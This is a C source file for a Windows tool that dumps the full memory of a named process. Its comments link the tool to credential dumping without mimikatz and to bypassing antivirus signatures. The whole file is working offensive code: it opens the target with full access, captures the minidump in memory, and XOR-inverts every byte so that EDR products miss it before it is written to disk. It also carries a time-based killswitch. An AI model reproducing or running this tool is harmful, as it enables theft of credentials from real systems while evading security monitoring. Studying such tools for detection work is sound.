/* Program to dump a process's memory to memory to avoid some problems with
 * dumping directly to disk.
 * This has been tested on Windows 7, 8.1 and Windows 10.
 * Due to a dependency DbgHelp 6.5, Windows XP, and Windows server 2003 will not work.
 * 
 * The created dump is inverted e.g., each byte is XOR:ed with 0xFF to avoid
 * some EDRs.
 * 
 * */
#include <sys/types.h>
#define _WIN32_WINNT 0x0602
#include <windows.h>
#include <tlhelp32.h>
#include "minidumpapiset.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "processdumper.h"
#pragma comment (lib, "Dbghelp.lib")

/*
 * The inspiration for this project came from a blogpost by https://www.ired.team:
 * https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-process-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
 * And also ideas for how to avoid detection by AV/EDR
 */

void reportBytesProcess(unsigned char *, DWORD);


LPVOID dumpBuffer;
size_t dumpBufferSize = 1024*1024*75; // Expect memory to dump to be less than 75MiB
DWORD bytesRead = 0;
int debug = 0;

BOOL CALLBACK minidumpCallback(
    __in    PVOID callbackParam,
    __in    const PMINIDUMP_CALLBACK_INPUT callbackInput,
    __inout PMINIDUMP_CALLBACK_OUTPUT callbackOutput
) {
    LPVOID destination = 0, source = 0;
    DWORD bufferSize = 0;

    switch (callbackInput->CallbackType)
    {
    case IoStartCallback:
        callbackOutput->Status = S_FALSE;
        if (debug) {
            printf("[Debug] Received IoStartCallback\n");
        }
        break;
    case IoWriteAllCallback:
        // Requires DbgHelp 6.5 or later to support the Io struct member.
        source = callbackInput->Io.Buffer;
        destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
        bufferSize = callbackInput->Io.BufferBytes;
        bytesRead += bufferSize;
        // Check if the pointer to + buffsize address is larger than the dumpBuffer offset + total length of buffer.
        // e.g., will this write put data after the dumpBuffer ends.
        DWORD_PTR targetpos = (DWORD_PTR)destination + (DWORD_PTR)bufferSize;
        DWORD_PTR dumpBufferMaxPos = (DWORD_PTR)dumpBuffer + (DWORD_PTR)dumpBufferSize;
        if (targetpos > dumpBufferMaxPos) {
            while (targetpos > dumpBufferMaxPos) {
                if (dumpBufferSize > 2000*1024*1024) { // Max allocate 2 GiB
                    printf("[+] Trying to allocate too large of a dumpbuffer, more than 1GiB\n");
                    return 0; // Return failure
                }
                dumpBufferSize = dumpBufferSize + 50*1024*1024; //Increase by 50MiB each time instead of double
                dumpBufferMaxPos = (DWORD_PTR)dumpBuffer + (DWORD_PTR)dumpBufferSize;
            }
            
            LPVOID newBuffer = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dumpBuffer, dumpBufferSize);
            if (newBuffer == NULL) {
                // Failed to allocate large enough buffer
                return 0; // Return failure
            }
            dumpBuffer = newBuffer;
            destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
        }

        for (int i=0; i<bufferSize; i++) {
            *(unsigned char *)(destination + i) = *(unsigned char *)(source + i) ^ 0xff;
        }

        callbackOutput->Status = S_OK;
        break;
    case IoFinishCallback:
        callbackOutput->Status = S_OK;
        break;
    default:
        break;
    }
    return 1;
}

void DumpProcess(int debugArg, char *targetProcess) {
    DWORD processPID = -1;
    debug = debugArg;
    
    HANDLE processHandle = NULL;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (debug) {
        printf("[Debug] Created snapshot\n");
    }
    char *processName = "";
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dumpBufferSize);
    if(NULL == dumpBuffer) {
        printf("[Debug] Failed to allocate memory (%d bytes)\n", dumpBufferSize);
        if(debug) {
            char buf[256];
            FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,NULL,GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),buf,(sizeof(buf)/sizeof(wchar_t)), NULL);
            printf("[Debug] Failed to allocate memory with error: %s\n", buf);
        }
        return;
    }
    if (debug) {
        printf("[Debug] Allocated memory for the memory dump\n");
    }

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (strcmp(processName, targetProcess) == 0) {
                processPID = processEntry.th32ProcessID;
                break;
            }
            processName = processEntry.szExeFile;
        } while(Process32Next(snapshot, &processEntry));

        if(processPID == -1) {
            printf("Process not found\n");
            if (debug) {
                printf("[Debug] Freeing allocated memory and closing snapshot\n");
            }
            CloseHandle(snapshot);
            HeapFree(GetProcessHeap(), 0, dumpBuffer);
            return;
        }
        printf("[+] %s PID=%d\n", targetProcess, processPID);
    }

    CloseHandle(snapshot);
    if (debug) {
        printf("[Debug] Attempting to open handle to the (%s) process\n", targetProcess);
    }
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processPID);
    if (debug) {
        printf("[Debug] Opened handle to the (%s) process\n", targetProcess);
    }

    MINIDUMP_CALLBACK_INFORMATION callbackInfo;
    ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    callbackInfo.CallbackRoutine = &minidumpCallback;
    callbackInfo.CallbackParam = NULL;

    if (debug) {
        printf("[Debug] Attempting to dump the (%s) process\n", targetProcess);
    }

    BOOL isDumped = MiniDumpWriteDump(processHandle, processPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
    if (isDumped) {
        reportBytesProcess(dumpBuffer, bytesRead);
    } else {
        printf("[+] Failed to dump the (%s) process!\n", targetProcess);
    }
    if (debug) {
        printf("[Debug] Freeing allocated memory\n");
    }
    HeapFree(GetProcessHeap(), 0, dumpBuffer);
}

FILE *outfile = NULL;
char *filename;

void reportBytesProcess(unsigned char *dumpBuffer, DWORD bytesRead) {
    // Write dump to file
    if (fwrite(dumpBuffer, 1, (size_t)bytesRead, outfile) != bytesRead) {
        printf("Failed to write process dump to file\n");
    } else {
        printf("Done, process dumped %d bytes written to %s\n", bytesRead, filename);
    }
}

int main(int argc, char *argv[]) {
    // Killswitch
    // Use :r! echo $(($(date +\%s)+604800))
    // Where 86400 is to make binary valid 1 day, 604800 is 1 week
    
    u_int64 endTime = 0000000000;
    u_int64 now = time(NULL);
    if (now > endTime) {
        return 0;
    }

    if (argc < 3) {
        printf("Usage: %s [options] <process name> <filepath>\n", argv[0]);
        printf("");
        printf("  [options]\n");
        printf("    -d, enable debug outprints\n");
        printf("\n");
        return -1;
    }
    char *targetProcess;
    if (argc > 3) {
        if (strncmp(argv[1], "-d", 2) == 0) {
            debug = 1;
        } else {
            printf("Unknown parameter: %s\n", argv[1]);
            return -1;
        }
        targetProcess = argv[2];
        filename = argv[3];
    } else {
        targetProcess = argv[1];
        filename = argv[2];
    }
    if (debug) {
        printf("[Debug] Attempting to open file (%s) for writing\n", filename);
    }

    if ((outfile = fopen(filename, "wb")) == NULL) // will replace existing files
    {
        printf("Failed to open file (%s)\n", filename);
        // Free memory
        return -1;
    }

    DumpProcess(debug, targetProcess);
}
